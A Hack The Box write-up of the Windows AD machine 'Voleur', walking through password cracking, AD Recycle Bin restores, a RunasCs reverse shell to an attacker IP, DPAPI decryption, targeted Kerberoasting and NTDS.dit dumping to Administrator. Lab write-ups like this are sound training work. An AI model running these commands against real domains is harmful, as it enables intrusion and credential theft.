# Voleur — Hack The Box

<p align="left">
  <img src="./assets/voleur/00-card.png" alt="Voleur HTB machine card" width="650">
</p>

| | |
|---|---|
| **Platform** | Hack The Box |
| **Difficulty** | Hard |
| **OS** | Windows |
| **Status** | ✅ Rooted (~4h with breaks) |
| **Key techniques** | office2john / Excel, AD Recycle Bin restore, RunasCs, DPAPI decrypt, targeted Kerberoast, Kerberos-only auth workflow, NTDS.dit from `C:\Backups` |

---

## TL;DR

Voleur is a chain box that only accepts Kerberos for anything meaningful
— NTLM is disabled on the DC. Given creds unlock SMB read on an IT share
holding a password-protected Excel; `office2john` + hashcat cracks it,
and its contents reference a **deleted** user (`todd.wolfe`). The current
identity can restore deleted objects via the AD Recycle Bin, so
`Get-ADObject -IncludeDeletedObjects` + `Restore-ADObject` brings
`todd.wolfe` back with usable credentials. `RunasCs.exe` runs in
`todd.wolfe`'s context, exposing DPAPI blobs that decrypt to
`jeremy.combs`. BloodHound then shows `jeremy.combs` has `GenericWrite`
on `lacey.miller` → targeted Kerberoast on a controlled SPN gives
`svc_ldap`, which produces `svc_winrm`. All auth from here is
Kerberos-only (`getTGT`, `KRB5CCNAME`, `-k -no-pass` on impacket
tooling), and getting `/etc/hosts` + `/etc/krb5.conf` wrong turns any
step into an unhelpful stack trace. There is also an `svc_backup` SSH
account whose home mounts `C:\Backups`, containing `SYSTEM`, `SAM`, and
`NTDS.dit` copies; offline `secretsdump` extracts the Administrator
NTLM, and a final `getTGT` + `evil-winrm -r voleur.htb` lands the DC.

---

## Recon

```bash
sudo nmap -p- -sCV <TARGET_IP>
```

![nmap](./assets/voleur/01-nmap.png)

Kerberos-heavy AD environment (KDC / LDAP / GC / SMB / WinRM). Added
the DC FQDN to `/etc/hosts` (this **must** be right for Kerberos):

![/etc/hosts](./assets/voleur/02-etc-hosts.png)

Assumed-breach account validated across the domain:

![Accounts inventory](./assets/voleur/03-accounts.png)
![Account creds](./assets/voleur/04-account-creds.png)
![Authentication check](./assets/voleur/05-authentication-accounts.png)

BloodHound as the initial user:

![BH upload](./assets/voleur/06-upload-bloodhound.png)
![BH collect](./assets/voleur/07-bloodhound-collect.png)

---

## SMB → encrypted Excel

The IT share held a `.xlsx` protected with a workbook password:

![Shares](./assets/voleur/08-shares.png)
![Todd's share](./assets/voleur/09-todd-shares.png)
![File on share](./assets/voleur/10-file-on-share.png)

```bash
office2john file.xlsx > excel.hash
hashcat -m 9600 excel.hash /usr/share/wordlists/rockyou.txt
```

![office2john hash](./assets/voleur/12-office2john-hash.png)
![Excel password recovered](./assets/voleur/11-password-excel.png)
![Password / encryption metadata](./assets/voleur/13-password-encryption.png)

The workbook referenced a **deleted** user `todd.wolfe` and notes hinting
at credentials tied to their account.

---

## AD Recycle Bin → restore `todd.wolfe`

The current identity had membership in a `Restore …` group with access
to the AD Recycle Bin:

```powershell
Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and Name -like "todd*"'
Restore-ADObject -Identity "<GUID>" -NewName "todd.wolfe"
```

![Enumerating deleted users](./assets/voleur/14-deleted-users.png)
![todd.wolfe in the bin](./assets/voleur/15-deleted-todd.png)
![Restore-ADObject](./assets/voleur/16-user-restore.png)
![todd.wolfe restored](./assets/voleur/17-restored-todd.png)

Workbook lines 2 and 3 supplied the credentials that reused after
restoration:

![Line 2 for todd](./assets/voleur/18-second-line-todd.png)
![Line 3 note](./assets/voleur/19-note-third-line.png)

---

## RunasCs → todd.wolfe context (for DPAPI)

DPAPI decryption of `todd.wolfe`'s blobs must run under their user
context (or their password must be provided separately). `RunasCs.exe`
spawns a callback:

```powershell
.\RunasCs.exe todd.wolfe '<pw>' powershell.exe -r 10.10.14.x:4444
```

![RunasCs uploaded](./assets/voleur/20-upload-runas.png)
![RunasCs invocation](./assets/voleur/21-runas-todd.png)

---

## DPAPI — todd.wolfe → jeremy.combs

Enumerated todd's AppData:

```powershell
ls -Force C:\Users\todd.wolfe\AppData\Local\Microsoft\Credentials\
ls -Force C:\Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\
ls -Force C:\Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\<SID>\
```

![AppData](./assets/voleur/22-appdata-todd.png)
![Protect folder](./assets/voleur/23-protect-appdata.png)
![Protect subfolder](./assets/voleur/24-protect-appdata-2.png)
![SID](./assets/voleur/25-sid.png)

Exfil via SMB (evil-winrm `download` is unreliable on hidden+system
attributes; SMB copy is safer):

```bash
impacket-dpapi masterkey -file masterkey.bin -sid <SID> -password '<todd_pw>'
impacket-dpapi credential -file blob.bin -key 0x<hex>
```

![masterkey decrypted](./assets/voleur/26-masterkey.png)
![DPAPI credentials](./assets/voleur/27-dpapi-credentials.png)
![jeremy.combs creds](./assets/voleur/28-jeremy-combs-creds.png)

---

## jeremy.combs → svc_ldap via targeted Kerberoast

BloodHound shows `GenericWrite` from `jeremy.combs` down to `lacey.miller`,
and `lacey.miller` (or the path through her) leads to `svc_ldap` via a
controlled-SPN targeted Kerberoast:

![GenericWrite path](./assets/voleur/29-restore-genericwrite-lacey.png)
![User flag](./assets/voleur/30-user-flag.png)

```bash
# Add SPN, request, crack:
impacket-GetUserSPNs -no-pass -k voleur.htb/<user> -request-user svc_ldap
hashcat <hash> /usr/share/wordlists/rockyou.txt
```

![Abusing the SPN](./assets/voleur/31-abuse-spn.png)
![svc_ldap membership](./assets/voleur/32-svc-ldap-member.png)
![Generating TGT for svc_ldap](./assets/voleur/33-svc-ldap-tgt.png)

---

## Kerberos-only workflow (the real time-sink)

NTLM disabled + `/etc/hosts` typo + `/etc/krb5.conf` untouched = every
step returns errors that look like permission problems but are really
Kerberos config problems:

![First TGT attempts](./assets/voleur/34-tgt-create.png)
![Errors](./assets/voleur/35-tgt-errors.png)
![More errors](./assets/voleur/36-more-errors.png)

Fixes in order:

- Correct DC FQDN in `/etc/hosts`
  ![DC name](./assets/voleur/37-correct-dc-name.png)
- Clock sync (`sudo ntpdate <DC>`)
  ![time sync](./assets/voleur/38-time-sync.png)
- Install `klist` (`sudo apt install krb5-user`)
  ![klist install](./assets/voleur/39-installing-klist.png)
- Populate `/etc/krb5.conf` with the correct realm / KDC
  ![krb5.conf](./assets/voleur/40-krb5-conf.png)

Working shape from there:

```bash
sudo ntpdate <DC>
impacket-getTGT voleur.htb/<user>:'<pw>'
export KRB5CCNAME=<user>.ccache
impacket-smbclient -k -no-pass //dc.voleur.htb/C$
evil-winrm -i dc.voleur.htb -u <user> -r voleur.htb
```

![Exporting TGT](./assets/voleur/41-export-tgt.png)
![Runas as svc_ldap](./assets/voleur/42-runas-svc-ldap.png)
![Shell as svc_ldap](./assets/voleur/43-shell-svc-ldap.png)
![NTLM disabled banner](./assets/voleur/44-ntlm-disabled.png)
![Not supported error](./assets/voleur/45-not-supported.png)
![Hacktricks reference](./assets/voleur/46-hacktricks-not-supported.png)
![SMB via Kerberos works](./assets/voleur/47-smb-kerberos-works.png)
![Todd's ticket](./assets/voleur/48-ticket-todd.png)
![Jeremy's ticket](./assets/voleur/49-ticket-jeremy.png)

---

## svc_ldap → svc_winrm → WinRM to DC

svc_ldap surfaces material for svc_winrm; WinRM lands on the DC:

![svc_winrm password](./assets/voleur/50-svc-winrm-password.png)
![TGT for svc_winrm](./assets/voleur/51-tgt-svc-winrm.png)
![svc_ldap → svc_winrm](./assets/voleur/52-svcldap-to-winrm.png)
![evil-winrm as svc account](./assets/voleur/53-evil-winrm-svc.png)

---

## Backup → NTDS.dit → Administrator

Also reachable: an `svc_backup` SSH account whose home mounts `C:\Backups`
containing copies of `SYSTEM`, `SAM`, `SECURITY`, and `NTDS.dit`:

![SSH as svc_backup](./assets/voleur/54-ssh-svc-backup.png)
![Mounted C:\Backups](./assets/voleur/55-mounted-backups.png)
![SECURITY / SAM in place](./assets/voleur/56-security-sam.png)
![System + security hashes](./assets/voleur/57-hashes-system-security.png)
![Copy SYSTEM+SAM+NTDS out](./assets/voleur/58-copy-sam-ntds.png)

Offline dump:

```bash
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY LOCAL
impacket-secretsdump -system SYSTEM -ntds NTDS.dit LOCAL
```

![Hashes](./assets/voleur/59-hashes.png)
![get protected material](./assets/voleur/60-get-protected.png)
![Downloading NTDS](./assets/voleur/61-downloading-file.png)

Final step — TGT for Administrator, WinRM in:

```bash
impacket-getTGT voleur.htb/Administrator -hashes :<NT>
export KRB5CCNAME=Administrator.ccache
evil-winrm -i dc.voleur.htb -u Administrator -r voleur.htb
```

![TGT for Administrator](./assets/voleur/62-tgt-administrator.png)
![root flag](./assets/voleur/63-root-flag.png)

---

## Lessons Learned

- **Kerberos errors are almost always config errors.** If `getTGT`
  fails with a name-lookup or clock-skew hint, the DC FQDN in
  `/etc/hosts` or the realm entry in `/etc/krb5.conf` is wrong, or
  `ntpdate` was not run. Fix those three things before assuming a
  credential is bad.
- **office2john is the reflex for any protected Office file** — same
  path for `.docx` / `.pptx` (mode 9400/9500/9600 by version). Never
  brute-force in the app.
- **AD Recycle Bin is a real attack surface.** `Get-ADObject
  -IncludeDeletedObjects` + `Restore-ADObject` on a domain where the
  identity is in a "restore" group is often the shortcut past a
  password-reset chain.
- **DPAPI blobs need the user context or their password.** `RunasCs`
  is the workhorse for the first case; masterkey + `-password` for
  the second. When both are available, prefer offline decryption on
  Kali — cleaner than PowerShell forensics on the box.
- **`WriteOwner` / `GenericWrite` on a user is a Kerberoast surface,
  not just a password-reset one.** Setting an SPN on the target and
  roasting it can be quieter and produce a hash for a service account
  that would not otherwise be roastable.
- **`evil-winrm -r <realm>`** — the `-r` flag switches evil-winrm into
  Kerberos mode using the current `KRB5CCNAME`. Trivial to forget on
  a Kerberos-only box.
- **`C:\Backups` is worth grepping on every Windows box.** SYSTEM +
  SAM + NTDS.dit copies bypass the whole live-attack path.

---

**Live version:** [read this write-up on my blog](https://debasjan.github.io/writeups/voleur/)
